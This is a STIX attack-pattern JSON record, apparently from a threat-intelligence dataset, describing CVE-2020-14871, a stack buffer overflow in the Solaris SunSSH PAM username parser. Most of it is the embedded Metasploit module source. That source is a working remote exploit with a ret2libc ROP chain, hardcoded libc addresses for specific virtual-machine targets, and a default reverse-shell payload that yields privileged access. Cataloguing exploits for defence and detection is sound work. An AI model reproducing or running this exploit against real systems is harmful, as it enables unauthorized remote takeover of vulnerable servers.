{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f8faf411-7af5-44ec-ae95-8fca090c818d",
    "created": "2024-08-14T16:34:00.427802Z",
    "modified": "2024-08-14T16:34:00.427806Z",
    "name": "Oracle Solaris SunSSH PAM parse_user_name() Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in the Solaris PAM library's username parsing code, as used by the SunSSH daemon when the keyboard-interactive authentication method is specified.  Tested against SunSSH 1.1.5 on Solaris 10u11 1/13 (x86) in VirtualBox VMware Fusion, and VMware Player. Bare metal untested. Your addresses may vary. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/solaris/ssh/pam_username_bof.rb",
            "external_id": "pam_username_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-14871"
        },
        {
            "source_name": "reference",
            "url": "https://www.oracle.com/security-alerts/cpuoct2020.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.fireeye.com/blog/threat-research/2020/11/critical-buffer-overflow-vulnerability-in-solaris-can-allow-remote-takeover.html"
        },
        {
            "source_name": "reference",
            "url": "https://hacker.house/lab/cve-2020-18471/"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/hackerfantastic/status/1323431512822435841"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = NormalRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::CheckModule\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Oracle Solaris SunSSH PAM parse_user_name() Buffer Overflow',\n        'Description' => %q{\n          This module exploits a stack-based buffer overflow in the Solaris PAM\n          library's username parsing code, as used by the SunSSH daemon when the\n          keyboard-interactive authentication method is specified.\n\n          Tested against SunSSH 1.1.5 on Solaris 10u11 1/13 (x86) in VirtualBox,\n          VMware Fusion, and VMware Player. Bare metal untested. Your addresses\n          may vary.\n        },\n        'Author' => [\n          'Jacob Thompson', # Analysis\n          'Aaron Carreras', # Analysis\n          'Jeffrey Martin', # Testing\n          'Hacker Fantastic', # PoC\n          'wvu' # Exploit\n        ],\n        'References' => [\n          ['CVE', '2020-14871'],\n          ['URL', 'https://www.oracle.com/security-alerts/cpuoct2020.html'],\n          ['URL', 'https://www.fireeye.com/blog/threat-research/2020/11/critical-buffer-overflow-vulnerability-in-solaris-can-allow-remote-takeover.html'],\n          ['URL', 'https://hacker.house/lab/cve-2020-18471/'],\n          ['URL', 'https://twitter.com/hackerfantastic/status/1323431512822435841']\n        ],\n        'DisclosureDate' => '2020-10-20', # Vendor advisory\n        'License' => MSF_LICENSE,\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Privileged' => true,\n        'Payload' => {\n          # https://github.com/illumos/illumos-gate/blob/edd669a7ce20a2f7406e8f00489c426c0690f1bd/usr/src/lib/libpam/pam_framework.c#L615-L617\n          'BadChars' => \"\\x00\\x09\\x20\",\n          'Encoder' => 'cmd/perl'\n        },\n        'Targets' => [\n          [\n            'SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware',\n            {\n              'Ident' => 'SSH-2.0-Sun_SSH_1.1.5',\n              'LibcBase' => 0xfeb90000\n            }\n          ],\n          [\n            'SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VirtualBox',\n            {\n              'Ident' => 'SSH-2.0-Sun_SSH_1.1.5',\n              'LibcBase' => 0xfeb80000\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/unix/reverse_perl',\n          'SSH_TIMEOUT' => 2,\n          'CheckModule' => 'auxiliary/scanner/ssh/ssh_version'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SERVICE_RESTARTS],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ACCOUNT_LOCKOUTS, IOC_IN_LOGS]\n        }\n      )\n    )\n  end\n\n  def check\n    # Run auxiliary/scanner/ssh/ssh_version\n    checkcode = super\n\n    return checkcode unless checkcode == CheckCode::Detected\n\n    unless target['Ident'] == checkcode.details[:ident]\n      return CheckCode::Safe(\"#{target.name} is an incompatible target.\")\n    end\n\n    CheckCode::Appears(\"#{target.name} is a compatible target.\")\n  end\n\n  def exploit\n    print_status(\"Exploiting #{target.name}\")\n\n    ssh_client_opts = ssh_client_defaults.merge(\n      port: rport,\n      auth_methods: ['keyboard-interactive'],\n      password: ret2libc, # HACK: This is really the username prompt on Solaris\n      timeout: datastore['SSH_TIMEOUT']\n    )\n\n    ssh_client_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    print_status(\"Yeeting #{datastore['PAYLOAD']} at #{peer}\")\n\n    # Empty initial username\n    Net::SSH.start(rhost, '', ssh_client_opts)\n  rescue Net::SSH::AuthenticationFailed\n    print_error(CheckCode::Safe.message)\n  rescue Net::SSH::Disconnect\n    print_warning('Disconnected, target selection may be incorrect!')\n  rescue Net::SSH::ConnectionTimeout\n    # Do nothing on success\n  end\n\n  # XXX: No ASLR, but NX stack and libc base changes...\n  def ret2libc\n    buf = rand_text(516) # Offset to saved EIP\n    buf << p32(target['LibcBase'] + 0x23904) # add esp, 8; ret\n    buf << rand_text(4) # Padding\n    buf << p32(0x08040101) # ecx\n    buf << p32(0x0805ba07) # pop ecx; pop edx; pop ebp; ret\n    buf << p32(target['LibcBase'] + 0x256d0) # exit(3)\n    buf << p32(target['LibcBase'] + 0x91edf) # system(3)\n    buf << rand_text(4) # Padding\n    buf << p32(target['LibcBase'] + 0xae3f1) # push esp; and al, 0; push ecx; push edx; ret\n    buf << payload.encoded\n  end\n\n  def p32(addr)\n    [addr].pack('V')\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-10-20, # Vendor advisory",
    "x_mitre_platforms": [
        "unix'"
    ]
}